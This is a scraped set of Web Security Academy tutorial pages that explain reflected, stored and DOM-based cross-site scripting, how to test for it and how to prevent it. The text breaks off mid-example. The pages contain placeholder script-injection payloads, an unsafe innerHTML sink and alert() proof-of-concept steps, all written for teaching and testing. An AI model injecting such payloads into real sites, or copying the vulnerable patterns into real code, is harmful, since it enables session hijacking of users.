[{"title": "What is XSS?", "content": "In this section, we'll explain what cross-site scripting is, describe the different varieties of cross-site scripting vulnerabilities, and spell out how to find and prevent cross-site scripting.\n\nWhat is cross-site scripting (XSS)?\n-----------------------------------\n\nCross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.\n\nHow does XSS work?\n------------------\n\nCross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.\n\n!\n\n#### Labs\n\nIf you're already familiar with the basic concepts behind XSS vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.\n\n*   [View all XSS labs](https://portswigger.net/web-security/all-labs#cross-site-scripting)\n\nXSS proof of concept\n--------------------\n\nYou can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript. It's long been common practice to use the `alert()` function for this purpose because it's short, harmless, and pretty hard to miss when it's successfully called. In fact, you solve the majority of our XSS labs by invoking `alert()` in a simulated victim's browser.\n\nUnfortunately, there's a slight hitch if you use Chrome. From version 92 onward (July 20th, 2021), cross-origin iframes are prevented from calling `alert()`. As these are used to construct some of the more advanced XSS attacks, you'll sometimes need to use an alternative PoC payload. In this scenario, we recommend the `print()` function. If you're interested in learning more about this change and why we like `print()`, [check out our blog post](https://portswigger.net/research/alert-is-dead-long-live-print) on the subject.\n\nAs the simulated victim in our labs uses Chrome, we've amended the affected labs so that they can also be solved using `print()`. We've indicated this in the instructions wherever relevant.\n\nWhat are the types of XSS attacks?\n----------------------------------\n\nThere are three main types of XSS attacks. These are:\n\n*   [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting), where the malicious script comes from the current HTTP request.\n*   [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.\n\nReflected cross-site scripting\n------------------------------\n\n[Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.\n\nHere is a simple example of a reflected XSS vulnerability:\n\n```\nhttps://insecure-website.com/status?message=All+is+well.\n<p>Status: All is well.</p>\n```\n\nThe application doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:\n\n```\nhttps://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>\n<p>Status: <script>/* Bad stuff here... */</script></p>\n```\n\nIf the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access.\n\nStored cross-site scripting\n---------------------------\n\n[Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (also known as persistent or second-order XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.\n\nThe data in question might be submitted to the application via HTTP requests; for example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. In other cases, the data might arrive from other untrusted sources; for example, a webmail application displaying messages received over SMTP, a marketing application displaying social media posts, or a network monitoring application displaying packet data from network traffic.\n\nHere is a simple example of a stored XSS vulnerability. A message board application lets users submit messages, which are displayed to other users:\n\n`<p>Hello, this is my message!</p>`\n\nThe application doesn't perform any other processing of the data, so an attacker can easily send a message that attacks other users:\n\n`<p><script>/* Bad stuff here... */</script></p>`\n\nDOM-based cross-site scripting\n------------------------------\n\n[DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) (also known as [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.\n\nIn the following example, an application uses some JavaScript to read the value from an input field and write that value to an element within the HTML:\n\n```\nvar search = document.getElementById('search').value;\nvar results = document.getElementById('results');\nresults.innerHTML = 'You searched for: ' + search;\n```\n\nIf the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute:\n\n`You searched for: <img src=1 onerror='/* Bad stuff here... */'>`\n\nIn a typical case, the input field would be populated from part of the HTTP request, such as a URL query string parameter, allowing the attacker to deliver an attack using a malicious URL, in the same manner as reflected XSS.\n\nWhat can XSS be used for?\n-------------------------\n\nAn attacker who exploits a cross-site scripting vulnerability is typically able to:\n\n*   Impersonate or masquerade as the victim user.\n*   Carry out any action that the user is able to perform.\n*   Read any data that the user is able to access.\n*   Capture the user's login credentials.\n*   Perform virtual defacement of the web site.\n*   Inject trojan functionality into the web site.\n\nImpact of XSS vulnerabilities\n-----------------------------\n\nThe actual impact of an XSS attack generally depends on the nature of the application, its functionality and data, and the status of the compromised user. For example:\n\n*   In a brochureware application, where all users are anonymous and all information is public, the impact will often be minimal.\n*   In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.\n*   If the compromised user has elevated privileges within the application, then the impact will generally be critical, allowing the attacker to take full control of the vulnerable application and compromise all users and their data.\n\nHow to find and test for XSS vulnerabilities\n--------------------------------------------\n\nThe vast majority of XSS vulnerabilities can be found quickly and reliably using Burp Suite's [web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner).\n\nManually testing for reflected and stored XSS normally involves submitting some simple unique input (such as a short alphanumeric string) into every entry point in the application, identifying every location where the submitted input is returned in HTTP responses, and testing each location individually to determine whether suitably crafted input can be used to execute arbitrary JavaScript. In this way, you can determine the [context](https://portswigger.net/web-security/cross-site-scripting/contexts) in which the XSS occurs and select a suitable payload to exploit it.\n\nManually testing for DOM-based XSS arising from URL parameters involves a similar process: placing some simple unique input in the parameter, using the browser's developer tools to search the DOM for this input, and testing each location to determine whether it is exploitable. However, other types of DOM XSS are harder to detect. To find DOM-based vulnerabilities in non-URL-based input (such as `document.cookie`) or non-HTML-based sinks (like `setTimeout`), there is no substitute for reviewing JavaScript code, which can be extremely time-consuming. Burp Suite's web vulnerability scanner combines static and dynamic analysis of JavaScript to reliably automate the detection of DOM-based vulnerabilities.\n\nContent security policy\n-----------------------\n\nContent security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities. If an application that employs CSP contains XSS-like behavior, then the CSP might hinder or prevent exploitation of the vulnerability. Often, the CSP can be circumvented to enable exploitation of the underlying vulnerability.\n\nDangling markup injection\n-------------------------\n\nDangling markup injection is a technique that can be used to capture data cross-domain in situations where a full cross-site scripting exploit is not possible, due to input filters or other defenses. It can often be exploited to capture sensitive information that is visible to other users, including CSRF tokens that can be used to perform unauthorized actions on behalf of the user.\n\nHow to prevent XSS attacks\n--------------------------\n\nPreventing cross-site scripting is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.\n\nIn general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:\n\n*   **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input.\n*   **Encode data on output.** At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.\n*   **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.\n*   **Content Security Policy.** As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.\n\nCommon questions about cross-site scripting\n-------------------------------------------\n\n**How common are XSS vulnerabilities?** XSS vulnerabilities are very common, and XSS is probably the most frequently occurring web security vulnerability.\n\n**How common are XSS attacks?** It is difficult to get reliable data about real-world XSS attacks, but it is probably less frequently exploited than other vulnerabilities.\n\n**What is the difference between XSS and CSRF?** XSS involves causing a web site to return malicious JavaScript, while CSRF involves inducing a victim user to perform actions they do not intend to do.\n\n**What is the difference between XSS and SQL injection?** XSS is a client-side vulnerability that targets other application users, while SQL injection is a server-side vulnerability that targets the application's database.\n\n**How do I prevent XSS in PHP?** Filter your inputs with a whitelist of allowed characters and use type hints or type casting. Escape your outputs with `htmlentities` and `ENT_QUOTES` for HTML contexts, or JavaScript Unicode escapes for JavaScript contexts.\n\n**How do I prevent XSS in Java?** Filter your inputs with a whitelist of allowed characters and use a library such as Google Guava to HTML-encode your output for HTML contexts, or use JavaScript Unicode escapes for JavaScript contexts.\n", "category": "XSS"}, {"title": "Reflected XSS", "content": "### Cross-site scripting (XSS)\n\n*   [What is XSS?](https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss)\n*   [How does XSS work?](https://portswigger.net/web-security/cross-site-scripting#how-does-xss-work)\n*   [Impact of an attack](https://portswigger.net/web-security/cross-site-scripting#impact-of-xss-vulnerabilities)\n*   [Proof of concept](https://portswigger.net/web-security/cross-site-scripting#xss-proof-of-concept)\n*   [Testing](https://portswigger.net/web-security/cross-site-scripting#how-to-find-and-test-for-xss-vulnerabilities)\n*    [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/reflected#impact-of-reflected-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts)\n    *   [Testing](https://portswigger.net/web-security/cross-site-scripting/reflected#how-to-find-and-test-for-reflected-xss-vulnerabilities)\n    *   [FAQs](https://portswigger.net/web-security/cross-site-scripting/reflected#common-questions-about-reflected-cross-site-scripting)\n*    [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/stored#impact-of-stored-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/stored#stored-xss-in-different-contexts)\n    *   [Testing for vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/stored#how-to-find-and-test-for-stored-xss-vulnerabilities)\n*    [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n    *    [Testing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-test-for-dom-based-cross-site-scripting)\n        *   [HTML sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-html-sinks)\n        *   [JavaScript execution sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-javascript-execution-sinks)\n        *   [Using DOM Invader](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-for-dom-xss-using-dom-invader)\n    *    [Exploiting](https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks)\n        *    [In third-party dependencies](https://portswigger.net/web-security/cross-site-scripting/dom-based#sources-and-sinks-in-third-party-dependencies)\n            *   [jQuery](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery)\n            *   [AngularJS](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-angularjs)\n        *   [DOM XSS combined with reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-prevent-dom-xss-vulnerabilities)\n*    [XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)\n    *   [Between HTML tags](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags)\n    *   [In HTML tag attributes](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes)\n    *    [JavaScript](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-javascript)\n        *   [Terminating the existing script](https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script)\n        *   [Breaking out of a string](https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string)\n        *   [Using HTML-encoding](https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding)\n        *   [Template literals](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals)\n    *    [Client-side template injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)\n        *   [AngularJS sandbox](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#what-is-the-angularjs-sandbox)\n        *    [AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-sandbox-escape-work)\n            *   [Constructing an advanced escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#constructing-an-advanced-angularjs-sandbox-escape)\n        *    [AngularJS CSP bypass](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-csp-bypass-work)\n            *   [Bypassing a CSP with an AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#bypassing-a-csp-with-an-angularjs-sandbox-escape)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-to-prevent-client-side-template-injection-vulnerabilities)\n*    [Exploiting XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)\n    *   [To steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-steal-cookies)\n    *   [To capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords)\n    *   [To perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-perform-csrf)\n*    [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)\n    *   [Preventing attacks](https://portswigger.net/web-security/cross-site-scripting/dangling-markup#how-to-prevent-dangling-markup-attacks)\n*    [Content security policy (CSP)](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)\n    *   [Mitigating XSS attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp)\n    *   [Mitigating dangling markup attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-dangling-markup-attacks-using-csp)\n    *   [Bypassing CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection)\n    *   [Protecting against clickjacking](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#protecting-against-clickjacking-using-csp)\n*    [Preventing XSS attacks](https://portswigger.net/web-security/cross-site-scripting/preventing)\n    *   [Encode data on output](https://portswigger.net/web-security/cross-site-scripting/preventing#encode-data-on-output)\n    *    [Validate input on arrival](https://portswigger.net/web-security/cross-site-scripting/preventing#validate-input-on-arrival)\n        *   [Whitelisting vs blacklisting](https://portswigger.net/web-security/cross-site-scripting/preventing#whitelisting-vs-blacklisting)\n    *   [Allowing \"safe\" HTML](https://portswigger.net/web-security/cross-site-scripting/preventing#allowing-safe-html)\n    *   [Using a template engine](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-using-a-template-engine)\n    *   [In PHP](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-php)\n    *   [In JavaScript](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-client-side-in-javascript)\n    *   [In jQuery](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-jquery)\n    *   [Using CSP](https://portswigger.net/web-security/cross-site-scripting/preventing#mitigating-xss-using-content-security-policy-csp)\n*   [Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n*   [View all XSS labs](https://portswigger.net/web-security/all-labs#cross-site-scripting)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)\n*   [Reflected](https://portswigger.net/web-security/cross-site-scripting/reflected)\n\nReflected XSS\n=============\n\nIn this section, we'll explain reflected cross-site scripting, describe the impact of reflected XSS attacks, and spell out how to find reflected XSS vulnerabilities.\n\nWhat is reflected cross-site scripting?\n---------------------------------------\n\nReflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.\n\nSuppose a website has a search function which receives the user-supplied search term in a URL parameter:\n\n`https://insecure-website.com/search?term=gift`The application echoes the supplied search term in the response to this URL:\n\n`<p>You searched for: gift</p>`Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:\n\n`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`This URL results in the following response:\n\n`<p>You searched for: <script>/* Bad stuff here... */</script></p>`If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.\n\nLAB\n\nAPPRENTICE [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)\n\nImpact of reflected XSS attacks\n-------------------------------\n\nIf an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:\n\n*   Perform any action within the application that the user can perform.\n*   View any information that the user is able to view.\n*   Modify any information that the user is able to modify.\n*   Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.\n\nThere are various means by which an attacker might induce a victim user to make a request that they control, to deliver a reflected XSS attack. These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet or other message. The attack could be targeted directly against a known user, or could be an indiscriminate attack against any users of the application.\n\nThe need for an external delivery mechanism for the attack means that the impact of reflected XSS is generally less severe than [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored), where a self-contained attack can be delivered within the vulnerable application itself.\n\n#### Read more\n\n*   [Exploiting cross-site scripting vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)\n\nReflected XSS in different contexts\n-----------------------------------\n\nThere are many different varieties of reflected cross-site scripting. The location of the reflected data within the application's response determines what type of payload is required to exploit it and might also affect the impact of the vulnerability.\n\nIn addition, if the application performs any validation or other processing on the submitted data before it is reflected, this will generally affect what kind of XSS payload is needed.\n\n#### Read more\n\n*   [Cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)\n\nHow to find and test for reflected XSS vulnerabilities\n------------------------------------------------------\n\nThe vast majority of reflected cross-site scripting vulnerabilities can be found quickly and reliably using Burp Suite's [web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner).\n\nTesting for reflected XSS vulnerabilities manually involves the following steps:\n\n*   **Test every entry point.** Test separately every entry point for data within the application's HTTP requests. This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers, although XSS-like behavior that can only be triggered via certain HTTP headers may not be exploitable in practice.\n*   **Submit random alphanumeric values.** For each entry point, submit a unique random value and determine whether the value is reflected in the response. The value should be designed to survive most input validation, so needs to be fairly short and contain only alphanumeric characters. But it needs to be long enough to make accidental matches within the response highly unlikely. A random alphanumeric value of around 8 characters is normally ideal. You can use Burp Intruder's [number payloads](https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types#numbers) with randomly generated hex values to generate suitable random values. And you can use Burp Intruder's [grep payloads settings](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/settings#grep-payloads) to automatically flag responses that contain the submitted value.\n*   **Determine the reflection context.** For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.\n*   **Test a candidate payload.** Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response. The easiest way to test payloads is to send the request to [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), modify the request to insert the candidate payload, issue the request, and then review the response to see if the payload worked. An efficient way to work is to leave the original random value in the request and place the candidate XSS payload before or after it. Then set the random value as the search term in Burp Repeater's response view. Burp will highlight each location where the search term appears, letting you quickly locate the reflection.\n*   **Test alternative payloads.** If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed. For more details, see [cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)\n*   **Test the attack in a browser.** Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser (by pasting the URL into the address bar, or by modifying the request in [Burp Proxy's intercept view](https://portswigger.net/burp/documentation/desktop/tools/proxy/intercept-messages), and see if the injected JavaScript is indeed executed. Often, it is best to execute some simple JavaScript like `alert(document.domain)` which will trigger a visible popup within the browser if the attack succeeds.\n\nCommon questions about reflected cross-site scripting\n-----------------------------------------------------\n\n**What is the difference between reflected XSS and stored XSS?** Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way.\n\n**What is the difference between reflected XSS and self-XSS?** Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.\n\n", "category": "XSS"}, {"title": "Stored XSS", "content": "### Cross-site scripting (XSS)\n\n*   [What is XSS?](https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss)\n*   [How does XSS work?](https://portswigger.net/web-security/cross-site-scripting#how-does-xss-work)\n*   [Impact of an attack](https://portswigger.net/web-security/cross-site-scripting#impact-of-xss-vulnerabilities)\n*   [Proof of concept](https://portswigger.net/web-security/cross-site-scripting#xss-proof-of-concept)\n*   [Testing](https://portswigger.net/web-security/cross-site-scripting#how-to-find-and-test-for-xss-vulnerabilities)\n*    [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/reflected#impact-of-reflected-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts)\n    *   [Testing](https://portswigger.net/web-security/cross-site-scripting/reflected#how-to-find-and-test-for-reflected-xss-vulnerabilities)\n    *   [FAQs](https://portswigger.net/web-security/cross-site-scripting/reflected#common-questions-about-reflected-cross-site-scripting)\n*    [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/stored#impact-of-stored-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/stored#stored-xss-in-different-contexts)\n    *   [Testing for vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/stored#how-to-find-and-test-for-stored-xss-vulnerabilities)\n*    [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n    *    [Testing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-test-for-dom-based-cross-site-scripting)\n        *   [HTML sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-html-sinks)\n        *   [JavaScript execution sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-javascript-execution-sinks)\n        *   [Using DOM Invader](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-for-dom-xss-using-dom-invader)\n    *    [Exploiting](https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks)\n        *    [In third-party dependencies](https://portswigger.net/web-security/cross-site-scripting/dom-based#sources-and-sinks-in-third-party-dependencies)\n            *   [jQuery](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery)\n            *   [AngularJS](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-angularjs)\n        *   [DOM XSS combined with reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-prevent-dom-xss-vulnerabilities)\n*    [XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)\n    *   [Between HTML tags](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags)\n    *   [In HTML tag attributes](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes)\n    *    [JavaScript](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-javascript)\n        *   [Terminating the existing script](https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script)\n        *   [Breaking out of a string](https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string)\n        *   [Using HTML-encoding](https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding)\n        *   [Template literals](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals)\n    *    [Client-side template injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)\n        *   [AngularJS sandbox](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#what-is-the-angularjs-sandbox)\n        *    [AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-sandbox-escape-work)\n            *   [Constructing an advanced escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#constructing-an-advanced-angularjs-sandbox-escape)\n        *    [AngularJS CSP bypass](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-csp-bypass-work)\n            *   [Bypassing a CSP with an AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#bypassing-a-csp-with-an-angularjs-sandbox-escape)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-to-prevent-client-side-template-injection-vulnerabilities)\n*    [Exploiting XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)\n    *   [To steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-steal-cookies)\n    *   [To capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords)\n    *   [To perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-perform-csrf)\n*    [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)\n    *   [Preventing attacks](https://portswigger.net/web-security/cross-site-scripting/dangling-markup#how-to-prevent-dangling-markup-attacks)\n*    [Content security policy (CSP)](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)\n    *   [Mitigating XSS attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp)\n    *   [Mitigating dangling markup attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-dangling-markup-attacks-using-csp)\n    *   [Bypassing CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection)\n    *   [Protecting against clickjacking](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#protecting-against-clickjacking-using-csp)\n*    [Preventing XSS attacks](https://portswigger.net/web-security/cross-site-scripting/preventing)\n    *   [Encode data on output](https://portswigger.net/web-security/cross-site-scripting/preventing#encode-data-on-output)\n    *    [Validate input on arrival](https://portswigger.net/web-security/cross-site-scripting/preventing#validate-input-on-arrival)\n        *   [Whitelisting vs blacklisting](https://portswigger.net/web-security/cross-site-scripting/preventing#whitelisting-vs-blacklisting)\n    *   [Allowing \"safe\" HTML](https://portswigger.net/web-security/cross-site-scripting/preventing#allowing-safe-html)\n    *   [Using a template engine](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-using-a-template-engine)\n    *   [In PHP](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-php)\n    *   [In JavaScript](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-client-side-in-javascript)\n    *   [In jQuery](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-jquery)\n    *   [Using CSP](https://portswigger.net/web-security/cross-site-scripting/preventing#mitigating-xss-using-content-security-policy-csp)\n*   [Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n*   [View all XSS labs](https://portswigger.net/web-security/all-labs#cross-site-scripting)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)\n*   [Stored](https://portswigger.net/web-security/cross-site-scripting/stored)\n\nStored XSS\n==========\n\nIn this section, we'll explain stored cross-site scripting, describe the impact of stored XSS attacks, and spell out how to find stored XSS vulnerabilities.\n\nWhat is stored cross-site scripting?\n------------------------------------\n\nStored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.\n\nSuppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:\n\n```\nPOST /post/comment HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 100\n\npostId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net\n```After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:\n\n`<p>This post was extremely helpful.</p>`Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:\n\n`<script>/* Bad stuff here... */</script>`Within the attacker's request, this comment would be URL-encoded as:\n\n`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`Any user who visits the blog post will now receive the following within the application's response:\n\n`<p><script>/* Bad 